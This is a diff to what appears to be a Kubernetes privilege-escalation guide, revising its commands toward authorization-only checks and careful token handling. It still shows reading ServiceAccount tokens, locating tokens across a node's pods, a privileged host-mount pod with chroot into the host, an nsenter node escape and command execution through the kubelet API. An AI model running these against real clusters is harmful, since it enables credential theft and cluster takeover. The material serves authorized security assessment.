@@ -7,41 +7,54 @@ cluster-admin, from node access to secret extraction, from RBAC misconfig to ful
 
 ## Quick Assessment: What Can I Do?
 
+For an authorized in-pod check, use the mounted ServiceAccount credentials, namespace,
+and CA directly. This needs a shell and curl with `--header @-` support, not
+kubectl. Confirm the mount belongs to the intended pod and cluster; stop on missing files
+or TLS/authentication errors. Keep tracing disabled while handling the token.
+
 ```bash
-# ServiceAccount token (auto-mounted in most pods)
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
-APISERVER="https://kubernetes.default.svc"
-CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+(
+set +x
+set -eu
+SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
+TOKEN=$(cat "$SA_DIR/token")
+NAMESPACE=$(cat "$SA_DIR/namespace")
+CACERT="$SA_DIR/ca.crt"
+APISERVER=https://kubernetes.default.svc
+: "${TOKEN:?ServiceAccount token is empty}"
+: "${NAMESPACE:?ServiceAccount namespace is empty}"
+[ -r "$CACERT" ]
 
-# Test API access
-curl -sk --cacert "$CACERT" "$APISERVER/api" -H "Authorization: Bearer $TOKEN"
-
-# What can this SA do? (self subject access review)
-curl -sk --cacert "$CACERT" "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NAMESPACE\"}}"
-
-# Quick checks for high-value permissions
-# List secrets
-curl -sk --cacert "$CACERT" "$APISERVER/api/v1/secrets" -H "Authorization: Bearer $TOKEN" 2>&1 | head -5
-# List all pods
-curl -sk --cacert "$CACERT" "$APISERVER/api/v1/pods" -H "Authorization: Bearer $TOKEN" 2>&1 | head -5
-# Create pods (test with dry-run)
-curl -sk --cacert "$CACERT" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods?dryRun=All" \
-  -H "Authorization: Bearer $TOKEN" -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test"},"spec":{"containers":[{"name":"t","image":"alpine"}]}}' 2>&1 | head -5
+# Ask authorization only; do not list secret values or submit a test pod.
+for action in 'list secrets' 'list pods' 'create pods'; do
+  verb=${action%% *}
+  resource=${action#* }
+  printf '\nChecking %s in namespace %s\n' "$action" "$NAMESPACE"
+  # printf is a shell builtin; the token reaches curl through stdin, not argv.
+  printf 'Authorization: Bearer %s\n' "$TOKEN" |
+    curl --disable --silent --show-error --fail --cacert "$CACERT" \
+      --header @- --header 'Content-Type: application/json' \
+      --data "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"$NAMESPACE\",\"verb\":\"$verb\",\"group\":\"\",\"resource\":\"$resource\"}}}" \
+      "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"
+done
+)
 ```
 
-If `kubectl` is available (not common in pods, but worth checking):
+Read each response's `status.allowed`, `status.denied`, `status.reason`, and any
+`status.evaluationError`. HTTP success only means the review request succeeded; it does
+not mean access was allowed. An evaluation error leaves coverage incomplete. An allowed
+pod-creation check still does not prove admission, scheduling, or host access.
+
+If kubectl is available, first verify that the explicit kubeconfig/context authenticates
+as the intended ServiceAccount against the intended cluster, with its CA configured:
+
 ```bash
-kubectl auth can-i --list
-kubectl auth can-i create pods
-kubectl auth can-i get secrets
-kubectl auth can-i '*' '*'  # cluster-admin check
+kubectl --kubeconfig "$SA_KUBECONFIG" --context "$SA_CONTEXT" auth can-i list secrets --namespace "$NAMESPACE"
+kubectl --kubeconfig "$SA_KUBECONFIG" --context "$SA_CONTEXT" auth can-i create pods --namespace "$NAMESPACE"
 ```
+
+A workstation administrator context tests a different identity. Do not substitute it for
+the mounted-token checks, and do not place bearer tokens in command arguments.
 
 ---
 
@@ -58,8 +71,9 @@ Before k8s 1.24, ServiceAccount tokens were:
 # Token is at:
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
-# Use it from outside the cluster
-kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify get pods
+# Outside the cluster, use a trusted, owner-readable kubeconfig for this SA with
+# the verified server/CA and tokenFile; do not pass a bearer token on the command line.
+kubectl --kubeconfig "$SA_KUBECONFIG" --context "$SA_CONTEXT" get pods --namespace "$NAMESPACE"
 ```
 
 ### Post-1.24 (Bound Tokens)
@@ -82,15 +96,9 @@ If you have node-level access, you can steal tokens from all pods on that node:
 # Find all mounted SA tokens
 find /var/lib/kubelet/pods/ -name 'token' -path '*/serviceaccount/*' 2>/dev/null
 
-# Read each and check what permissions it has
-for t in $(find /var/lib/kubelet/pods/ -name 'token' -path '*/serviceaccount/*' 2>/dev/null); do
-  echo "=== $t ==="
-  TOKEN=$(cat "$t")
-  curl -sk "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-    -H "Authorization: Bearer $TOKEN" \
-    -H "Content-Type: application/json" \
-    -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' 2>&1 | head -20
-done
+# For a selected in-scope mount, use the Quick Assessment block with SA_DIR set
+# to that mount's directory. Confirm its namespace, cluster endpoint, and CA.
+# Do not silently use the default namespace or print/copy tokens into argv.
 ```
 
 ---
@@ -152,8 +160,9 @@ kubectl --as=system:serviceaccount:kube-system:default \
 
 ## 3. Pod-Based Escalation
 
-If you can create pods (or deployments/jobs/cronjobs/daemonsets), you can likely get node-level
-or cluster-admin access.
+Pod or workload creation alone does not establish node or cluster-admin access. Check
+admission policy, allowed security contexts and host mounts, scheduling constraints, and
+the workload identity before claiming an escalation path.
 
 ### Privileged Pod with Host Mount
 
@@ -185,7 +194,7 @@ spec:
   #   kubernetes.io/hostname: target-node
 ```
 
-Then: `kubectl exec -it pwned - chroot /host bash`
+Then: `kubectl exec -it pwned -- chroot /host bash`
 
 ### Escape to Node via nsenter
 
@@ -194,7 +203,7 @@ the relevant capabilities and policy permissions:
 
 ```bash
 # Enter all namespaces of host PID 1
-nsenter -t 1 -m -u -i -n -p - /bin/bash
+nsenter -t 1 -m -u -i -n -p -- /bin/bash
 ```
 
 ### Stealing Secrets via Pod
@@ -280,12 +289,16 @@ curl -s http://NODE_IP:10255/pods
 
 ### With Valid Credentials
 
+Direct kubelet access is not an unconditional RBAC bypass. With Webhook authorization,
+the kubelet submits SubjectAccessReview requests to the API server; effective access
+depends on that policy and the authenticated identity.
+
 ```bash
 # List pods on this node
 curl -sk https://NODE_IP:10250/pods \
   --cert /path/to/client.crt --key /path/to/client.key
 
-# Execute command in a pod via kubelet (bypasses RBAC)
+# Execute only if kubelet authorization permits this request
 curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
   --cert /path/to/client.crt --key /path/to/client.key \
   -d "cmd=id"
